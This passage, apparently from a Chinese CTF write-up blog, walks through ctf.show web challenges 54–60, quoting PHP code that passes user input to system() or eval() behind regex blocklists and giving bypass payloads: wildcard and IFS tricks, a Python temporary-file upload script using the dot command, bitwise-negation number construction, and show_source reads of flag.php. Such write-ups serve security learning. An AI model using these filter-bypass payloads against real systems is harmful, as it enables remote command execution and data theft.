），在某些上下文中，它可能用于通配符匹配或具有特殊意义。</li>\n<li><code>.*m.*o.*r.*e.*</code> 、 <code>.*w.*g.*e.*t.*</code> 、 <code>.*l.*e.*s.*s.*</code>  等：这些模式分别查找包含 <code>more</code> 、 <code>wget</code> 、 <code>less</code>  等命令的字符串，这些命令通常用于文件操作或数据传输。</li>\n<li><code>.*h.*e.*a.*d.*</code> 、 <code>.*s.*o.*r.*t.*</code> 、 <code>.*t.*a.*i.*l.*</code>  等：查找包含 <code>head</code> 、 <code>sort</code> 、 <code>tail</code>  等 Unix/Linux 命令的字符串，这些命令用于处理文本数据。</li>\n<li><code>.*s.*e.*d.*</code> 、 <code>.*c.*u.*t.*</code> 、 <code>.*t.*a.*c.*</code>  等：查找包含 <code>sed</code> 、 <code>cut</code> 、 <code>tac</code>  等命令的字符串，这些命令用于文本处理。</li>\n<li><code>.*a.*w.*k.*</code> ：查找包含 <code>awk</code>  的字符串， <code>awk</code>  是一个强大的文本处理工具。</li>\n<li><code>.*s.*t.*r.*i.*n.*g.*s.*</code> ：查找包含 <code>strings</code>  的字符串， <code>strings</code>  命令用于提取二进制文件中的可打印字符串。</li>\n<li><code>.*o.*d.*</code> ：查找包含 <code>od</code>  的字符串， <code>od</code> （八进制转储）命令用于以八进制或其他格式转储文件内容。</li>\n<li><code>.*c.*u.*r.*l.*</code> ：查找包含 <code>curl</code>  的字符串， <code>curl</code>  是一个用于传输数据的命令行工具。</li>\n<li><code>.*n.*l.*</code> ：可能意图查找包含 <code>nl</code>  的字符串，但此模式较为宽泛，因为 <code>n</code>  和 <code>l</code>  是常见字母。</li>\n<li><code>.*s.*c.*p.*</code> ：查找包含 <code>scp</code>  的字符串， <code>scp</code>  是安全复制命令，用于在本地和远程之间安全地传输文件。</li>\n<li><code>.*r.*m.*</code> ：查找包含 <code>rm</code>  的字符串， <code>rm</code>  命令用于删除文件或目录。</li>\n<li><code>\\</code> 、 <code>%</code> 、 <code>\\x09</code> 、 <code>\\x26</code> 、 <code>&gt;</code> 、 <code>&lt;</code> ：查找反引号（```）、百分号（ <code>%</code> ）、制表符（ <code>\\x09</code> ）、 <code>&amp;</code>  符号的 HTML 实体（ <code>\\x26</code> ）、大于号（ <code>&gt;</code> ）、小于号（ <code>&lt;</code> ），这些字符或模式可能在尝试执行命令或注入代码时具有特殊意义。</li>\n</ol>\n<p>整个正则表达式使用了 <code>i</code>  修饰符，表示不区分大小写。如果 <code>preg_match</code>  返回 <code>false</code> （即没有找到匹配项），则意味着字符串 <code>$c</code>  不包含上述任何敏感模式或字符。这通常用于安全检查，以防止潜在的恶意输入。</p>\n</blockquote>\n<p>​\t\t这里直接用下面这个方式绕：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=grep$&#123;IFS&#125;<span class=\"string\">&#x27;&#123;&#x27;</span>$&#123;IFS&#125;fl???php</span><br><span class=\"line\">（在 fl???php匹配到的文件中，查找含有&#123;的文件，并打印出包含 &#123; 的这一行）</span><br></pre></td></tr></table></figure>\n<h1 id=\"web55\"><a class=\"markdownIt-Anchor\" href=\"#web55\">#</a> Web55：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t终于到了新玩意儿了，无字母 RCE，有几种方法：<br>\n查看源代码发现没有过滤数字，我们就想一想在我们查看文件的命令有没有数字开头的。<br>\n匹配到 /bin 目录下的命令<br>\n cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64 等<br>\n发现存在一个 base64<br>\n 我们就可以通过通配符进行匹配命令执行查看 flag.php<br>\npayload：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=/???/????64 ????.???</span><br><span class=\"line\">意思是 /bin/base64 flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web56\"><a class=\"markdownIt-Anchor\" href=\"#web56\">#</a> Web56：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\&#123;|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">解题思路：过滤了分号，字母，数字等等符号</span><br><span class=\"line\">本题没有过滤符号.(点)，因此可以想到linux中该符号.(点)的用法，与source命令用法相同：linxu中source命令和.(点)</span><br><span class=\"line\">总体分析后，可以post上传一个php文件，内容为所需执行的linux指令，然后使用glob通配符和.(点)来将其中的内容以linux指令的形式来进行执行。</span><br></pre></td></tr></table></figure>\n<p>​\t\t还是 system，不过这次多过滤了字母。用下面这个脚本去跑，不过原理不是很清楚，贴一个链接，有条件就去学习一下。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnNpbmEuY29tLmNuL3MvYmxvZ19hZjY4YTJjMjAxMDE2bmgyLmh0bWw=\">LINUX 中的点命令，或 source 命令，或点符号</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS1hZHZhbmNlZC5odG1s\">无字母数字 webshell 之提高篇</span></p>\n<p>​\t\tpython 脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://c7ab10d0-d6da-40f4-8e90-c56abda22ce1.challenge.ctf.show/&quot;</span></span><br><span class=\"line\">payload = &#123;<span class=\"string\">&quot;c&quot;</span>:<span class=\"string\">&quot;. /???/????????[@-[]&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;.\\\\a.txt&#x27;</span>,<span class=\"string\">&#x27;r&#x27;</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">    files = &#123;<span class=\"string\">&#x27;file&#x27;</span>: file&#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        r = requests.post(url,params=payload,files=files)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> r.text:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + r.text)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;.&quot;</span>, end=<span class=\"string\">&#x27; &#x27;</span>,flush=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t另外还需要创建一个 a.txt 文件，里面的内容为 cat flag.php</p>\n<h1 id=\"web57\"><a class=\"markdownIt-Anchor\" href=\"#web57\">#</a> Web57：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 还能炫的动吗？</span></span><br><span class=\"line\"><span class=\"comment\">//flag in 36.php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&quot;cat &quot;</span>.<span class=\"variable\">$c</span>.<span class=\"string\">&quot;.php&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t这个似乎可以取反做：</p>\n<blockquote>\n<p>在 liunx 中，$(()) 为 0 , <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(()))) 为 - 1 ~<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>代表取反，</mtext><mn>0</mn><mtext>取反后为</mtext><mo>−</mo><mn>1</mn><mtext>，这样就可以先构造出</mtext><mo>−</mo><mn>37</mn><mtext>，取反后就为</mtext><mn>36</mn><mtext>，也就是</mtext></mrow><annotation encoding=\"application/x-tex\">代表取反，0取反后为-1，这样就可以先构造出-37，取反后就为36，也就是</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord cjk_fallback\">代</span><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">取</span><span class=\"mord cjk_fallback\">反</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord\">0</span><span class=\"mord cjk_fallback\">取</span><span class=\"mord cjk_fallback\">反</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">为</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord\">1</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">这</span><span class=\"mord cjk_fallback\">样</span><span class=\"mord cjk_fallback\">就</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">先</span><span class=\"mord cjk_fallback\">构</span><span class=\"mord cjk_fallback\">造</span><span class=\"mord cjk_fallback\">出</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">取</span><span class=\"mord cjk_fallback\">反</span><span class=\"mord cjk_fallback\">后</span><span class=\"mord cjk_fallback\">就</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord\">3</span><span class=\"mord\">6</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">也</span><span class=\"mord cjk_fallback\">就</span><span class=\"mord cjk_fallback\">是</span></span></span></span> (()) 中有 37 个<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(()))) 在加上取反，也就是<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(()))) 中有 37 个 - 1</p>\n</blockquote>\n<p>​\t\t先贴一个无字母数字 RCE 的总结：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvODEwNz90aW1lX18xMzExPW40JTJCeG5EMERjN0dRRHREa1dHT0RsaGplMCUzRDZBZ2doaXJPTW93aUQ=\">无字母数字 webshell 总结</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYxNzc4MTI4L2FydGljbGUvZGV0YWlscy8xMjcwNjM0MDc/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjJENjgxNDdERS1BRUIzLTRCMUUtQjEyRC03NjE5RTREQzEzNTElMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPUQ2ODE0N0RFLUFFQjMtNEIxRS1CMTJELTc2MTlFNERDMTM1MSZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTI3MDYzNDA3LW51bGwtbnVsbC4xNDIlNUV2MTAwJTVFcGNfc2VhcmNoX3Jlc3VsdF9iYXNlNiZhbXA7dXRtX3Rlcm09bGludXglRTUlOEYlOTYlRTUlOEYlOEQlRTUlOTElQkQlRTQlQkIlQTRyY2UlRTglODQlOUElRTYlOUMlQUMmYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3\">无数字字母 rce 总结（取反、异或、自增、临时文件）</span></p>\n<p>​\t\t可惜，做题的这个考点似乎这两篇文章里没有：</p>\n<blockquote>\n<p>双小括号 (()) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在 ((和)) 之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号，分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( )) 命令的执行结果。 可以使用<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>获取</mtext><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mtext>命令的结果，这和使用</mtext></mrow><annotation encoding=\"application/x-tex\">获取 (( )) 命令的结果，这和使用</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord cjk_fallback\">获</span><span class=\"mord cjk_fallback\">取</span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mord cjk_fallback\">命</span><span class=\"mord cjk_fallback\">令</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">结</span><span class=\"mord cjk_fallback\">果</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">这</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord cjk_fallback\">使</span><span class=\"mord cjk_fallback\">用</span></span></span></span>获得变量值是类似的。 可以在 (()) 前面加上<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>符号获取</mtext><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mtext>命令的执行结果，也即获取整个表达式的值。以</mtext><mi>c</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord cjk_fallback\">符</span><span class=\"mord cjk_fallback\">号</span><span class=\"mord cjk_fallback\">获</span><span class=\"mord cjk_fallback\">取</span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mord cjk_fallback\">命</span><span class=\"mord cjk_fallback\">令</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">执</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">结</span><span class=\"mord cjk_fallback\">果</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">也</span><span class=\"mord cjk_fallback\">即</span><span class=\"mord cjk_fallback\">获</span><span class=\"mord cjk_fallback\">取</span><span class=\"mord cjk_fallback\">整</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">达</span><span class=\"mord cjk_fallback\">式</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">值</span><span class=\"mord cjk_fallback\">。</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span>((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c=((a+b)) 这样的写法是错误的，不加 $ 就不能取得表达式的结果。</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo $&#123;_&#125; #返回上一次的执行结果`</span><br><span class=\"line\">echo $(()) #0</span><br><span class=\"line\">echo $((~$(()))) #~0是-1</span><br><span class=\"line\">$(($((~$(())))$((~$(()))))) #$((-1-1))即$$((-2))是-2</span><br><span class=\"line\">echo $((~-37)) #~-37是36</span><br></pre></td></tr></table></figure>\n<p>​\t\t所以 payload：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>((<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))<span class=\"built_in\">$</span>((~<span class=\"built_in\">$</span>(())))))))</span><br></pre></td></tr></table></figure>\n<p>​\t\t可以用这个脚本生成简单的数字：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">num_1 = <span class=\"string\">&quot;$((~$(())))&quot;</span></span><br><span class=\"line\">inta = <span class=\"number\">36</span></span><br><span class=\"line\">resp = <span class=\"string\">&quot;$((~$((&quot;</span>+ num_1 * <span class=\"number\">37</span>  +<span class=\"string\">&quot;))))&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(resp)</span><br></pre></td></tr></table></figure>\n<h1 id=\"web58\"><a class=\"markdownIt-Anchor\" href=\"#web58\">#</a> Web58：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t乍一看，好像很简单，不过，当我 post 了一个 phpinfo 之后，发现了函数被禁了：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Warning: phpinfo() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1</span><br></pre></td></tr></table></figure>\n<p>​\t\t建议直接 fuzz 一下，看看具体哪些被 ban 了，这里就直接 show_source 了：</p>\n<blockquote>\n<p>c=show_source(‘flag.php’);<br>\nc=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>\n</blockquote>\n<h1 id=\"web59\"><a class=\"markdownIt-Anchor\" href=\"#web59\">#</a> Web59：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 你们在炫技吗？</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t具体不知道有些啥被 ban 了，只能一个个测，结果和上一题一样，show_source 依旧过了：</p>\n<blockquote>\n<p>c=show_source(“flag.php”);</p>\n</blockquote>\n<h1 id=\"web60\"><a class=\"markdownIt-Anchor\" href=\"#web60\">#</a> Web60：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 